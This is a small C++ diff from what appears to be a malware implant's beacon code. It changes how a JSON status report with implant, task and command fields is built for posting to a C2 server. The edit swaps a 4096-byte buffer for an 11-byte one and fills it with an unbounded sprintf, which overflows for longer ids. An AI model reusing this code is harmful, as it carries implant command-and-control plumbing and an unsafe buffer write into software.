@@ -26,10 +26,11 @@ std::string makeHttpRequestData(std::string fqdn, int port, std::string uri, std
         temp = 1;
     }
     int length = 7 + temp;
-    char postdata[4096];
-    length = 4096;
+    char postdata[11];
+    //length = 4096;
 
-    sprintf(postdata, "{\"target_implant_id\":%d, \"task_id\": %d, \"response_data\": \"%s\", \"success\": %d, \"command\": \"%s\" }", implant_id, 1, data.c_str(), 1, "fuck");
+    //sprintf(postdata, "{\"target_implant_id\":%d, \"task_id\": %d, \"response_data\": \"%s\", \"success\": %d, \"command\": \"%s\" }", 1, 1, data.c_str(), 1, "fuck");
+        sprintf(postdata, "{\"id\":%d}", implant_id);
     printf("%s", postdata);
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
